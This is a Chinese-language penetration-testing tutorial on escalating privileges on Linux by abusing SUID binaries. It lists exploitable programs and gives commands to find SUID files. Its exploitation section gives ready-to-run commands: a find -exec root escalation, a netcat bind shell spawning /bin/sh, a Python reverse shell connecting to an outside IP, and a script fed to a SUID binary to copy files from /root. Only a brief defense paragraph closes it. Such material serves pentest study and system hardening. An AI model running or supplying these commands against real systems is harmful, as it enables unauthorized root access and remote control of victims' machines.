## **SUID**
SUID是一种特殊的文件权限，它允许用户在执行某个程序时，以该程序所有者的身份运行程序。通常情况下，这种权限被赋予给需要高权限执行的程序，例如系统管理工具或某些命令行实用程序。当这些程序设置了SUID位时，即使普通用户也可以执行它们并获得程序所有者的权限(通常是root用户)。

如：由于管理员经常查找文件，为了这个文件查找的结果更多，赋予了find查找程序suid的root权限，
即root用户执行了 chmod +s /usr/bin/find 或 chmod u+s /usr/bin/find。
而find可以加-exec参数进行其他命令的组合，那么-exec后面的命令就是root权限执行。

## **配置安全：SUID提权**
SUID提权是一种在Linux系统中利用SUID（Set User ID）权限进行权限提升的技术。
在安全领域，SUID提权通常被视为一种潜在的安全风险。攻击者如果能够利用SUID程序中的漏洞或者通过其他方式滥用SUID程序的权限，就可能执行原本只有高权限用户才能执行的操作，比如修改系统文件、访问敏感数据或者完全控制系统。因此，SUID提权是安全研究者和渗透测试人员在评估系统安全性时关注的重点之一。

以下是一些常见的SUID提权方法和工具：
1. **Nmap**: Nmap是一个网络扫描工具，如果它具有SUID权限，攻击者可以通过其交互模式执行任意命令。
2. **Vim**: Vim是一个文本编辑器，具有SUID权限的Vim可以被用来执行命令，从而获取更高权限。
3. **Find**: Find命令用于查找文件，如果具有SUID权限，可以通过其-exec选项执行任意命令。
4. **Less和More**: 这两个文本查看器在具有SUID权限时，可以通过输入`!`后跟shell命令来执行shell命令。
5. **Nano**: 类似于Vim，具有SUID权限的Nano编辑器可以用来执行命令。
6. **Cp和Mv**: 这两个文件操作命令在具有SUID权限时，可以用来覆盖敏感文件，如`/etc/passwd`，从而可能实现提权。
7. 更多存在suid提权漏洞的程序(有-exec参数)<https://gtfobins.github.io/> 搜suid

## **检测SUID**
为了检测系统上的SUID文件，可以使用如下命令：
```
find / -user root -perm -4000 -print 2>/dev/null
```
或者
```
find / -perm -u=s -type f 2>/dev/null
```
这个命令会搜索整个文件系统，查找属于root用户且设置了SUID权限的文件。
查找列出的命令，和实际存在SUID提权的命令比对，如有find，则find命令存在suid，可以使用find操作root权限，如执行whoami。
**PS：有可能一些管理员自己写的程序也有suid，注意特殊路径下的文件名。**
>find存在SUID是由于管理员经常查找文件，为了这个文件查找的结果更多，赋予了find查找程序suid的root权限
而且find可以加-exec参数进行其他命令的组合，那么-exec后面的命令就是root权限执行。
```
touch xiaodi
find xiaodi -exec whoami \;
即可返回root
```

^
## **suid命令可能是交互式shell(一般不是，除非自定义的)**
哥斯拉的超级终端是交互式shell。
或者，传参执行。
```
已知/tmp/xxSuidElf是suid有root权限的执行命令，但是交互式命令

echo "cat /root/哈哈.txt > /tmp/哈哈.txt " > tmp.sh
chmod +x tmp.sh
echo "tmp.sh"  |  /tmp/xxSuidElf

此时查看/tmp/哈哈.txt
```


## **提权利用**
利用NC正向
```
需要目标机上的netcat或nc支持-e参数
find xiaodi -exec netcat -lvp 5555 -e /bin/sh \;

攻击机连接：
netcat xx.xx.xx.xx:5555
```
利用Python反弹
```
find xiaodi -exec python -c  'import 
socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('47.94.0.0',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
p=subprocess.call(['/bin/bash','-i']);' \;

攻击机监听接收：
nc -lvp 7777
```
更多反弹命令生成：http://forum.ywhack.com/shell.php

^
## **防御**
为了防止SUID提权的风险，系统管理员需要定期检查SUID程序的安全性，确保它们没有已知的漏洞，并且只对确实需要的程序赋予SUID权限。同时，也应该限制普通用户能够访问的SUID程序，减少潜在的攻击面。